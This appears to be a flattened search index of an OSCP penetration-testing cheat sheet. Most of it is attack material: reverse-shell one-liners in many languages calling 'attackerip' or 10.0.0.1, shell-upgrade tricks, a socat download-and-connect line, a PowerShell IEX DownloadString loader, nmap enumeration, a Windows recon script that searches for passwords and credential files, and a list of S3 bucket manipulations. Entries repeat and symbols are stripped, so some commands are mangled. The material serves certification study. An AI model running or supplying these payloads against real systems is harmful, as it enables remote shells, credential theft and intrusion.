/ sh 10 . 0 . 0 . 1 1234 / bin / sh | nc attackerip 4444 rm / tmp / f ; mkfifo / tmp / f ; cat / tmp / f |/ bin / sh - i 2 1 | nc 10 . 0 . 0 . 1 1234 / tmp / f rm - f / tmp / p ; mknod / tmp / p p nc attackerip 4444 0 / tmp / p 2 1 Two connections: nc localhost 1233 | / bin / sh | nc 127 . 0 . 0 . 1 1234 Telnet rm - f / tmp / p ; mknod / tmp / p p telnet attackerip 4444 0 / tmp / p 2 1 telnet attackerip 4444 | / bin / bash | telnet attackerip 4445 # Remember to listen on your machine also on port 4445 / tcp Java r = Runtime . getRuntime () p = r . exec ( [ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String [] ) p . waitFor () Xterm xterm - display attackerip : 1 # Or : DISPLAY = attackerip : 0 xterm On solaris / usr / openwin / bin / xterm - display attackerip : 1 Xnest : 1 xterm - display 127.0 . 0.1 : 1 # Run this OUTSIDE the Xnest xhost + targetip # Run this INSIDE the spawned xterm on the open X Server Gawk `` References http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://www.gnucitizen.org/blog/reverse-shell-with-bash","title":"Bash"},{"location":"certifications/oscp/cheatsheet/shell/#bash","text":"bash - i / dev / tcp / 10 . 0 . 0 . 1 / 8080 0 1 exec / bin / bash 0 0 2 0 0 196 ;exec 196 /dev/tcp/attackerip/4444; sh 196 196 2 196 Create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor (does not work in Debian): exec 5 / dev / tcp / attackerip / 4444 cat 5 | while read line ; do $line 2 5 5; done # or : while read line 0 5 ; do $line 2 5 5; done Banner a HTTP server using Bash: #!/bin/bash exec 3 /dev/tcp/ $1 /80 echo -e Get /simple?se=1 HTTP/1.0\\n 3 cat 3","title":"Bash"},{"location":"certifications/oscp/cheatsheet/shell/#perl","text":"Unix: perl - e use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );}; perl - MIO - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; Windows perl - MIO - e $c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; print $ sock eval ( $ sock ) while ( $ sock ||= IO :: Socket :: INET - new ( PeerAddr = 127.0.0.1 , PeerPort = 23666 ))","title":"Perl"},{"location":"certifications/oscp/cheatsheet/shell/#python","text":"python - c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);","title":"Python"},{"location":"certifications/oscp/cheatsheet/shell/#php","text":"php - r $sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 ); ? php $ sock = fsockopen ( 10.0.0.1 , 1234 ) ;exec( /bin/sh -i 3 3 2 3 ); ?","title":"PHP"},{"location":"certifications/oscp/cheatsheet/shell/#ruby","text":"Unix ruby - rsocket - e f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f) ruby - rsocket - e exit if fork;c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end Windows ruby - rsocket - e c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end","title":"Ruby"},{"location":"certifications/oscp/cheatsheet/shell/#netcat","text":"nc - e / bin / sh 10 . 0 . 0 . 1 1234 nc - c / bin / sh 10 . 0 . 0 . 1 1234 / bin / sh | nc attackerip 4444 rm / tmp / f ; mkfifo / tmp / f ; cat / tmp / f |/ bin / sh - i 2 1 | nc 10 . 0 . 0 . 1 1234 / tmp / f rm - f / tmp / p ; mknod / tmp / p p nc attackerip 4444 0 / tmp / p 2 1 Two connections: nc localhost 1233 | / bin / sh | nc 127 . 0 . 0 . 1 1234","title":"NetCat"},{"location":"certifications/oscp/cheatsheet/shell/#telnet","text":"rm - f / tmp / p ; mknod / tmp / p p telnet attackerip 4444 0 / tmp / p 2 1 telnet attackerip 4444 | / bin / bash | telnet attackerip 4445 # Remember to listen on your machine also on port 4445 / tcp","title":"Telnet"},{"location":"certifications/oscp/cheatsheet/shell/#java","text":"r = Runtime . getRuntime () p = r . exec ( [ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String [] ) p . waitFor ()","title":"Java"},{"location":"certifications/oscp/cheatsheet/shell/#xterm","text":"xterm - display attackerip : 1 # Or : DISPLAY = attackerip : 0 xterm On solaris / usr / openwin / bin / xterm - display attackerip : 1 Xnest : 1 xterm - display 127.0 . 0.1 : 1 # Run this OUTSIDE the Xnest xhost + targetip # Run this INSIDE the spawned xterm on the open X Server","title":"Xterm"},{"location":"certifications/oscp/cheatsheet/shell/#gawk","text":"``","title":"Gawk"},{"location":"certifications/oscp/cheatsheet/shell/#references","text":"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://www.gnucitizen.org/blog/reverse-shell-with-bash","title":"References"},{"location":"certifications/oscp/cheatsheet/tty/","text":"TTY python - c import pty; pty.spawn( /bin/sh ) python - c import pty; pty.spawn( /bin/bash ) python3 - c import pty; pty.spawn( /bin/bash ) echo os . system ( /bin/bash ) / bin / sh - i perl \u2014 e exec /bin/sh ; perl : exec /bin/sh ; ruby : exec /bin/sh lua : os . execute ( /bin/sh ) IRB : exec /bin/sh vi : : ! bash vi : : set shell =/ bin / bash : shell nmap : ! sh web ttys https://github.com/maxmcd/webtty socat On Kali (listen): socat file : `tty` , raw , echo = 0 tcp - listen : 4444 On Victim (launch): socat exec : bash -li , pty , stderr , setsid , sigint , sane tcp : 10 . 10 . 10 . 10 : 4444 wget - q https : // github . com / andrew - d / static - binaries / raw / master / binaries / linux / x86_64 / socat - O / tmp / socat ; chmod +x /tmp/socat; /tmp/socat exec: bash -li ,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444 netcat Send nc to background Check the term name and size on local machine with: echo $ TERM stty - a stty raw - echo fg to being nc back up reset export SHELL = bash xterm export TERM = xterm stty rows 38 columns 116 Row and column values are found using stty - a . References https://netsec.ws/?p=337 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell","title":"TTY"},{"location":"certifications/oscp/cheatsheet/tty/#tty","text":"python - c import pty; pty.spawn( /bin/sh ) python - c import pty; pty.spawn( /bin/bash ) python3 - c import pty; pty.spawn( /bin/bash ) echo os . system ( /bin/bash ) / bin / sh - i perl \u2014 e exec /bin/sh ; perl : exec /bin/sh ; ruby : exec /bin/sh lua : os . execute ( /bin/sh ) IRB : exec /bin/sh vi : : ! bash vi : : set shell =/ bin / bash : shell nmap : ! sh","title":"TTY"},{"location":"certifications/oscp/cheatsheet/tty/#web-ttys","text":"https://github.com/maxmcd/webtty","title":"web ttys"},{"location":"certifications/oscp/cheatsheet/tty/#socat","text":"On Kali (listen): socat file : `tty` , raw , echo = 0 tcp - listen : 4444 On Victim (launch): socat exec : bash -li , pty , stderr , setsid , sigint , sane tcp : 10 . 10 . 10 . 10 : 4444 wget - q https : // github . com / andrew - d / static - binaries / raw / master / binaries / linux / x86_64 / socat - O / tmp / socat ; chmod +x /tmp/socat; /tmp/socat exec: bash -li ,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444","title":"socat"},{"location":"certifications/oscp/cheatsheet/tty/#netcat","text":"Send nc to background Check the term name and size on local machine with: echo $ TERM stty - a stty raw - echo fg to being nc back up reset export SHELL = bash xterm export TERM = xterm stty rows 38 columns 116 Row and column values are found using stty - a .","title":"netcat"},{"location":"certifications/oscp/cheatsheet/tty/#references","text":"https://netsec.ws/?p=337 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell","title":"References"},{"location":"certifications/oscp/cheatsheet/web/","text":"Web Scaning Droopescan: SilverStripe Wordpress, Joomla, Moodle, Drupal: https://github.com/droope/droopescan","title":"Web"},{"location":"certifications/oscp/cheatsheet/web/#web","text":"","title":"Web"},{"location":"certifications/oscp/cheatsheet/web/#scaning","text":"Droopescan: SilverStripe Wordpress, Joomla, Moodle, Drupal: https://github.com/droope/droopescan","title":"Scaning"},{"location":"certifications/oscp/cheatsheet/windows/","text":"Windows General cat = type Powershell echo IEX (( New - Object System . Net . WebClient ). DownloadString ( http://10.10.14.9:8000/PowerUp.ps1 )) | powershell - noprofile - Services List all: sc query state = all Prev Escalation PowerUp.ps1 Sherlock.ps1","title":"Windows"},{"location":"certifications/oscp/cheatsheet/windows/#windows","text":"","title":"Windows"},{"location":"certifications/oscp/cheatsheet/windows/#general","text":"cat = type","title":"General"},{"location":"certifications/oscp/cheatsheet/windows/#powershell","text":"echo IEX (( New - Object System . Net . WebClient ). DownloadString ( http://10.10.14.9:8000/PowerUp.ps1 )) | powershell - noprofile -","title":"Powershell"},{"location":"certifications/oscp/cheatsheet/windows/#services","text":"List all: sc query state = all","title":"Services"},{"location":"certifications/oscp/cheatsheet/windows/#prev-escalation","text":"PowerUp.ps1 Sherlock.ps1","title":"Prev Escalation"},{"location":"certifications/oscp/cheatsheet/enumeration/network/","text":"Scan for hosts nmap - sn $ iprange - oG - | grep Up | cut - d - f2 network . txt Port scanning TCP Top 1000: nmap - Pn - sC - sV - oA tcp - vv $ ip Quick TCP nmap - sC - sV - vv - oA quick 10 . 10 . 10 . 10 All TCP Ports: nmap - sC - sV - oA all - vv - p - $ ip UDP Top 100: nmap - Pn - sU --top-ports 100 -oA udp -vv $ip Quick UDP nmap - sU - sV - vv - oA quick_udp 10 . 10 . 10 . 10 Port Knocking for x in 7000 8000 9000 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done","title":"Network"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#scan-for-hosts","text":"nmap - sn $ iprange - oG - | grep Up | cut - d - f2 network . txt","title":"Scan for hosts"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#port-scanning","text":"","title":"Port scanning"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#tcp-top-1000","text":"nmap - Pn - sC - sV - oA tcp - vv $ ip","title":"TCP Top 1000:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#quick-tcp","text":"nmap - sC - sV - vv - oA quick 10 . 10 . 10 . 10","title":"Quick TCP"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#all-tcp-ports","text":"nmap - sC - sV - oA all - vv - p - $ ip","title":"All TCP Ports:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#udp-top-100","text":"nmap - Pn - sU --top-ports 100 -oA udp -vv $ip","title":"UDP Top 100:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#quick-udp","text":"nmap - sU - sV - vv - oA quick_udp 10 . 10 . 10 . 10","title":"Quick UDP"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#port-knocking","text":"for x in 7000 8000 9000 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done","title":"Port Knocking"},{"location":"certifications/oscp/cheatsheet/enumeration/vulnerability/","text":"Search searchsploit --exclude=dos -t apache 2.2.3 msfconsole ; search apache 2 . 2 . 3","title":"Vulnerability"},{"location":"certifications/oscp/cheatsheet/enumeration/vulnerability/#search","text":"searchsploit --exclude=dos -t apache 2.2.3 msfconsole ; search apache 2 . 2 . 3","title":"Search"},{"location":"certifications/oscp/cheatsheet/enumeration/windows-local/","text":"localrecon.cmd https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd @echo off REM REM This software is provided under under the BSD 3 - Clause License . REM See the accompanying LICENSE file for more information . REM REM Utility to generate a summary of a Windows system REM REM Author : REM Arris Huijgen ( @ _ bitsadmin ) REM REM Website : REM https : // github . com / bitsadmin / REM REM TODO : REM * Check drives other than C :\\ ( if available ) REM * Add commandline parameter to perform a brief check or more extended REM * Make sure that the output of this script is not again included in the output REM REM Some more ( untested ) commands : REM pushd C :\\ ^ ^ findstr / I / N / S / P / R flag password secret confidential account payroll credit record * ^ ^ popd REM dir C :\\ / S / O - D / TW ^ | findstr / C : Directory of / C : %d% !;! REM dir C :\\ / a - r - d / s / b REM To add : for / F tokens=2* delims= %%i in ( sc query ^| find /I ce_name ) do @sc qc %i %j REM setlocal enabledelayedexpansion set o= %tmp%\\recon%random%.out set d=- 12 - 2016 REM Define a separator character (!;!) ( set ; =^ %=Do not remove this line=% ) set t [ 0 ][ name ] = Basic 1 set t [ 0 ] = COMPUTERNAME !;! USERDNSDOMAIN !;! USERNAME !;! HOMEDRIVE !;! HOMEPATH set t [ 1 ][ name ] = Basic 2 set t [ 1 ] = systeminfo !;! wmic logicaldisk get caption , description , drivetype , providername , volumename ^ | more set t [ 2 ][ name ] = Users set t [ 2 ] = query session !;! net user !;! net localgroup Administrators !;! net user Administrator !;! tree / F C :\\ Users !;!dir /s /b /A:H C :\\ Users \\ ^|find /V desktop . ini !;!tree /F C :\\ Documents and Settings !;!dir /s /b /A:H C :\\ Documents and Settings \\ ^|find /V desktop . ini set t[3][name]=Network set t[3]=ipconfig /all!;!route print!;!arp -a!;!netstat -ano!;!net session ^| find \\\\ !;! net view !;! netsh advfirewall show allprofiles !;! netsh firewall show state !;! netsh firewall show config !;! nltest / dclist : set t [ 4 ][ name ] = Processes , services and tasks set t [ 4 ] = wmic PROCESS get Processid , Caption , Commandline ^ | more !;! query process * !;! tasklist / SVC !;! net start !;! DRIVERQUERY / V !;! schtasks / query / fo LIST / v !;! at !;! dir / B C :\\ WINDOWS \\ Tasks !;! set ^ | find / V t[ set t [ 5 ][ name ] = Patch - level set t [ 5 ] = wmic qfe get Caption , Description , HotFixID , InstalledOn ^ | more set t [ 6 ][ name ] = Base image configuration files set t [ 6 ] = dir / s / b C :\\sysprep . inf C :\\sysprep . xml C :\\unattend . txt C :\\ Unattended . xml C :\\ Services . xml C :\\ ScheduledTasks . xml C :\\ Printers . xml C :\\ Drives . xml C :\\ DataSources . xml set t [ 7 ][ name ] = Configuration set t [ 7 ] = reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsSvr \\ Parameters \\ SafeSetUidGidBits !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsServer \\ Parameters \\ SafeSetUidGidBits !;! gpresult / z set t [ 8 ][ name ] = Credentials set t [ 8 ] = cmdkey / list !;! dir / s / b / a : - D C :\\*pass * C :\\*cred * C :\\*vnc * C :\\*.config * C :\\*.kdb* !;! findstr / si password *.xml *.ini *.txt *.ps1 *.cmd !;! reg query HKLM / f password / t REG_SZ / s !;! reg query HKCU / f password / t REG_SZ / s !;! reg query HKLM \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon / V Default * set t [ 9 ][ name ] = Remote Desktop applications and VPN set t [ 9 ] = dir / b / s C :\\*vnc . ini !;! reg query HKCU \\ SOFTWARE \\ ORL \\ WinVNC3 \\ Password !;! dir / s / b C :\\*.rdp C :\\*.pbk !;! reg query HKCU \\ Software \\ SimonTatham \\ PuTTY \\ Sessions !;! reg query HKCU \\ Software \\ Microsoft \\ Terminal Server Client \\ Servers /s set t[9][name]=Configuration 2 set t[9]=wmic service get name,displayname,pathname,startmode^|findstr /i Auto ^|findstr /i /v C :\\ Windows \\\\ ^|findstr /i /v set t [ 10 ][ name ] = Files set t [ 10 ] = dir / S / A / B C :\\network - secret . txt C :\\proof . txt C :\\local . txt C :\\*.vsd * C :\\*flag * C :\\*password * C :\\*bank * C :\\*competit * C :\\*finance * C :\\*invoice * C :\\*risk * C :\\*key * C :\\*.pcf C :\\*.crt C :\\*.key C :\\*.log ^ | find / V / I %SystemRoot%\\winsxs\\ ^| find /I /V %SystemRoot%\\Microsoft.NET\\ set t [ 11 ][ name ] = E - mail and documents set t [ 11 ] = dir / S / A / B *.dbx *.wab *.doc *.docx *.xlsx set t [ 12 ][ name ] = Pre - installed languages set t [ 12 ] = where python !;! where perl !;! where ruby !;! dir / s / b C :\\python . exe C :\\pythonw . exe C :\\perl . exe C :\\ruby . exe C :\\rubyw . exe C :\\bash . exe C :\\java . exe C :\\javaw . exe C :\\php . exe C :\\powershell . exe set last = 12 :: CMD variables echo --------------- [ 0 / %last%] %t[0][name]% --------------- %o% 2 1 echo --------------- [ 0 / %last%] %t[0][name]% --------------- FOR / F %%i IN ( !t[0]! ) DO ( echo =^ %%~i echo %%i: !%%i! %o% 2 1 ) :: Commands FOR / L %%n IN (1,1,%last%) DO ( echo . %o% 2 1 echo . %o% 2 1 echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- %o% 2 1 echo . echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- FOR / F delims=; %%i IN ( !t[%%n]! ) DO ( set c= %%~i echo =^ ! c ! %o% 2 1 echo =^ ! c ! REM If command does not contain a pipe , execute directly REM Otherwise execute using cmd / c IF ! c ! == ! c : ^ | = ! ( ! c ! %o% 2 1 ) ELSE ( cmd / C !c! %o% 2 1 ) echo . %o% 2 1 echo . %o% 2 1 ) ) REM Results echo . echo Done . Results in %o%.","title":"Windows local"},{"location":"certifications/oscp/cheatsheet/enumeration/windows-local/#localreconcmd","text":"https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd @echo off REM REM This software is provided under under the BSD 3 - Clause License . REM See the accompanying LICENSE file for more information . REM REM Utility to generate a summary of a Windows system REM REM Author : REM Arris Huijgen ( @ _ bitsadmin ) REM REM Website : REM https : // github . com / bitsadmin / REM REM TODO : REM * Check drives other than C :\\ ( if available ) REM * Add commandline parameter to perform a brief check or more extended REM * Make sure that the output of this script is not again included in the output REM REM Some more ( untested ) commands : REM pushd C :\\ ^ ^ findstr / I / N / S / P / R flag password secret confidential account payroll credit record * ^ ^ popd REM dir C :\\ / S / O - D / TW ^ | findstr / C : Directory of / C : %d% !;! REM dir C :\\ / a - r - d / s / b REM To add : for / F tokens=2* delims= %%i in ( sc query ^| find /I ce_name ) do @sc qc %i %j REM setlocal enabledelayedexpansion set o= %tmp%\\recon%random%.out set d=- 12 - 2016 REM Define a separator character (!;!) ( set ; =^ %=Do not remove this line=% ) set t [ 0 ][ name ] = Basic 1 set t [ 0 ] = COMPUTERNAME !;! USERDNSDOMAIN !;! USERNAME !;! HOMEDRIVE !;! HOMEPATH set t [ 1 ][ name ] = Basic 2 set t [ 1 ] = systeminfo !;! wmic logicaldisk get caption , description , drivetype , providername , volumename ^ | more set t [ 2 ][ name ] = Users set t [ 2 ] = query session !;! net user !;! net localgroup Administrators !;! net user Administrator !;! tree / F C :\\ Users !;!dir /s /b /A:H C :\\ Users \\ ^|find /V desktop . ini !;!tree /F C :\\ Documents and Settings !;!dir /s /b /A:H C :\\ Documents and Settings \\ ^|find /V desktop . ini set t[3][name]=Network set t[3]=ipconfig /all!;!route print!;!arp -a!;!netstat -ano!;!net session ^| find \\\\ !;! net view !;! netsh advfirewall show allprofiles !;! netsh firewall show state !;! netsh firewall show config !;! nltest / dclist : set t [ 4 ][ name ] = Processes , services and tasks set t [ 4 ] = wmic PROCESS get Processid , Caption , Commandline ^ | more !;! query process * !;! tasklist / SVC !;! net start !;! DRIVERQUERY / V !;! schtasks / query / fo LIST / v !;! at !;! dir / B C :\\ WINDOWS \\ Tasks !;! set ^ | find / V t[ set t [ 5 ][ name ] = Patch - level set t [ 5 ] = wmic qfe get Caption , Description , HotFixID , InstalledOn ^ | more set t [ 6 ][ name ] = Base image configuration files set t [ 6 ] = dir / s / b C :\\sysprep . inf C :\\sysprep . xml C :\\unattend . txt C :\\ Unattended . xml C :\\ Services . xml C :\\ ScheduledTasks . xml C :\\ Printers . xml C :\\ Drives . xml C :\\ DataSources . xml set t [ 7 ][ name ] = Configuration set t [ 7 ] = reg query HKLM \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKCU \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ Installer \\ AlwaysInstallElevated !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsSvr \\ Parameters \\ SafeSetUidGidBits !;! reg query HKLM \\ System \\ CurrentControlSet \\ Services \\ NfsServer \\ Parameters \\ SafeSetUidGidBits !;! gpresult / z set t [ 8 ][ name ] = Credentials set t [ 8 ] = cmdkey / list !;! dir / s / b / a : - D C :\\*pass * C :\\*cred * C :\\*vnc * C :\\*.config * C :\\*.kdb* !;! findstr / si password *.xml *.ini *.txt *.ps1 *.cmd !;! reg query HKLM / f password / t REG_SZ / s !;! reg query HKCU / f password / t REG_SZ / s !;! reg query HKLM \\ SOFTWARE \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon / V Default * set t [ 9 ][ name ] = Remote Desktop applications and VPN set t [ 9 ] = dir / b / s C :\\*vnc . ini !;! reg query HKCU \\ SOFTWARE \\ ORL \\ WinVNC3 \\ Password !;! dir / s / b C :\\*.rdp C :\\*.pbk !;! reg query HKCU \\ Software \\ SimonTatham \\ PuTTY \\ Sessions !;! reg query HKCU \\ Software \\ Microsoft \\ Terminal Server Client \\ Servers /s set t[9][name]=Configuration 2 set t[9]=wmic service get name,displayname,pathname,startmode^|findstr /i Auto ^|findstr /i /v C :\\ Windows \\\\ ^|findstr /i /v set t [ 10 ][ name ] = Files set t [ 10 ] = dir / S / A / B C :\\network - secret . txt C :\\proof . txt C :\\local . txt C :\\*.vsd * C :\\*flag * C :\\*password * C :\\*bank * C :\\*competit * C :\\*finance * C :\\*invoice * C :\\*risk * C :\\*key * C :\\*.pcf C :\\*.crt C :\\*.key C :\\*.log ^ | find / V / I %SystemRoot%\\winsxs\\ ^| find /I /V %SystemRoot%\\Microsoft.NET\\ set t [ 11 ][ name ] = E - mail and documents set t [ 11 ] = dir / S / A / B *.dbx *.wab *.doc *.docx *.xlsx set t [ 12 ][ name ] = Pre - installed languages set t [ 12 ] = where python !;! where perl !;! where ruby !;! dir / s / b C :\\python . exe C :\\pythonw . exe C :\\perl . exe C :\\ruby . exe C :\\rubyw . exe C :\\bash . exe C :\\java . exe C :\\javaw . exe C :\\php . exe C :\\powershell . exe set last = 12 :: CMD variables echo --------------- [ 0 / %last%] %t[0][name]% --------------- %o% 2 1 echo --------------- [ 0 / %last%] %t[0][name]% --------------- FOR / F %%i IN ( !t[0]! ) DO ( echo =^ %%~i echo %%i: !%%i! %o% 2 1 ) :: Commands FOR / L %%n IN (1,1,%last%) DO ( echo . %o% 2 1 echo . %o% 2 1 echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- %o% 2 1 echo . echo --------------- [ %%n/%last%] !t[%%n][name]! --------------- FOR / F delims=; %%i IN ( !t[%%n]! ) DO ( set c= %%~i echo =^ ! c ! %o% 2 1 echo =^ ! c ! REM If command does not contain a pipe , execute directly REM Otherwise execute using cmd / c IF ! c ! == ! c : ^ | = ! ( ! c ! %o% 2 1 ) ELSE ( cmd / C !c! %o% 2 1 ) echo . %o% 2 1 echo . %o% 2 1 ) ) REM Results echo . echo Done . Results in %o%.","title":"localrecon.cmd"},{"location":"cloud/aws/","text":"References https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://anir0y.live/class/blog/securityaudit-aws/ Unauthenticated AWS Role Enumeration (IAM Revisited): https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/ S3 New References S3 Book: https://github.com/nagwww/aws-s3-book Collections https://github.com/nagwww/101-AWS-S3-Hacks Hack : Add ACL to an Object . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to an object . Grant Read privilages to the bucket using email address Hack : Add ACL to the bucket . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to the bucket . Grant Read privilages to the bucket using email address Hack : Add a tag to S3 bucket Hack : Add lifecycle to S3 Folder Hack : Add lifecycle to S3 bucket Hack : Add lifecycle to S3 bucket , set the effective date . Don t specify the time or specify GMT midnight Hack : Add lifecycle to S3 bucket , set the effective days Hack : Check if a key exists Hack : Compute MD5 for an S3 object Hack : Configure this bucket to act as a website Hack : Convert an existing key in an S3 bucket that uses the STANDARD to RRS Hack : Copy the current key to a different Bucket Hack : Copy the current key to a different Bucket with Reduced Redundancy Storage ( RRS ) Hack : Create a Bucket in S3 Hack : Create a S3 bucket in a different region EU Hack : Create a folder in a S3 bucket Hack : Create a new object in S3 Hack : Delete a S3 bucket Hack : Delete a s3 object Hack : Delete all cors for the s3 bucket Hack : Delete all files in a folder Hack : Delete lifecycle to S3 bucket Hack : Delete tags of a S3 bucket Hack : Disable Logging for the S3 bucket Hack : Disable a buckets Versioning Hack : Disable a lifecycle to S3 bucket Hack : Download a S3 file or a S3 object Hack : Download a file using the method get_file Hack : Enable Logging for the S3 bucket Hack : Enable Versioning Hack : Find out the status of the Bucket Versioning Hack : Generate a URL for the S3 bucket with an expiration time 20 seconds Hack : Generate a URL for the S3 object with expiration of 5 min Hack : Get CORS for an S3 bucket Hack : Get CORS for an S3 bucket as xml Hack : Get a metadata value name name added to the S3 object Hack : Get all the S3 regions Hack : Get all the metadata added to the S3 object Hack : Get all the versions of the S3 Objects Hack : Get an expiry date of a key / object in S3 Hack : Get lifecycle to S3 bucket Hack : Get lifecycle to S3 bucket as xml Hack : Get status of the restore of an object from glacier Hack : Get the ACL of the S3 bucket Hack : Get the ACL of the object Hack : Get the ACL of the object as xml Hack : Get the Location of the s3 bucket Hack : Get the bucket Policy Hack : Get the canonical user id of the S3 bucket Hack : Get the content type of object . Note only works with get_key Hack : Get the contents of the object as a string Hack : Get the get_xml_acl of an S3 object Hack : Get the redirect for an S3 object Hack : Get the tags of a S3 bucket Hack : Get the website configuration for this s3 bucket Hack : Get the website configuration in xml for this s3 bucket Hack : Get the website_endpoint of a s3 bucket Hack : How to add an exception Hack : How to enable debugging for S3 Hack : List all the S3 buckets Hack : List all the grants for a given Bucket Hack : List all the objects Owner Hack : List all the objects in a S3 bucket Hack : List all the objects last modified timestamp in Zulu format Hack : List all the objects size in bytes Hack : List all the objects with in a bucket Hack : List all the objects with in a bucket and if the object is moved to Glacier Hack : List all the objects with in a bucket with a prefix Hack : List all the objects with the versions for a given Bucket Hack : List whether the object is encrypted while at rest on the server Hack : Logging status for the S3 bucket Hack : Make S3 bucket public readable Hack : Make a http connection to S3 instead of https Hack : Make an object public Hack : Move s3 objects to Glacier Hack : Move s3 objects to Glacier add a Expiration Hack : Restore an object from glacier Hack : Search for bucket in a different AWS Region Hack : Search for a bucket with bucket name which is case sensitive Hack : Search for a specific bucket Hack : Set a canned ACL for object , authenticated - read Hack : Set a canned ACL for object , canned_bucket_owner_full_control Hack : Set a canned ACL for object , canned_bucket_owner_read Hack : Set a canned ACL for object , public read Hack : Set a canned ACL for object , public read write Hack : Set a canned ACL , authenticated - read Hack : Set a canned ACL , private Hack : Set a canned ACL , public - read Hack : Set a canned ACL , public - read - write Hack : Set a private canned ACL for an object Hack : Set a redirect for an S3 object Hack : Set metadata for a new s3 object on creation Hack : Set set_request_payment for a bucket Hack : Set the bucket Policy Hack : Set the meta data for an object Hack : Set up CORS for an S3 bucket Hack : Upload a file to S3 bucket using method initiate_multipart_upload . Note should be 5 MB Hack : Upload a file to S3 bucket using method set_contents_from_filename Hack : Upload a file to s3 bucket using the method send_file","title":"Aws"},{"location":"cloud/aws/#references","text":"https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://anir0y.live/class/blog/securityaudit-aws/ Unauthenticated AWS Role Enumeration (IAM Revisited): https://rhinosecuritylabs.com/aws/aws-role-enumeration-iam-p2/","title":"References"},{"location":"cloud/aws/#s3","text":"","title":"S3"},{"location":"cloud/aws/#new-references","text":"S3 Book: https://github.com/nagwww/aws-s3-book","title":"New References"},{"location":"cloud/aws/#collections","text":"https://github.com/nagwww/101-AWS-S3-Hacks Hack : Add ACL to an Object . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to an object . Grant Read privilages to the bucket using email address Hack : Add ACL to the bucket . Grant Read privilages to the bucket using canonical user id Hack : Add ACL to the bucket . Grant Read privilages to the bucket using email address Hack : Add a tag to S3 bucket Hack : Add lifecycle to S3 Folder Hack : Add lifecycle to S3 bucket Hack : Add lifecycle to S3 bucket , set the effective date . Don t specify the time or specify GMT midnight Hack : Add lifecycle to S3 bucket , set the effective days Hack : Check if a key exists Hack : Compute MD5 for an S3 object Hack : Configure this bucket to act as a website Hack : Convert an existing key in an S3 bucket that uses the STANDARD to RRS Hack : Copy the current key to a different Bucket Hack : Copy the current key to a different Bucket with Reduced Redundancy Storage ( RRS ) Hack : Create a Bucket in S3 Hack : 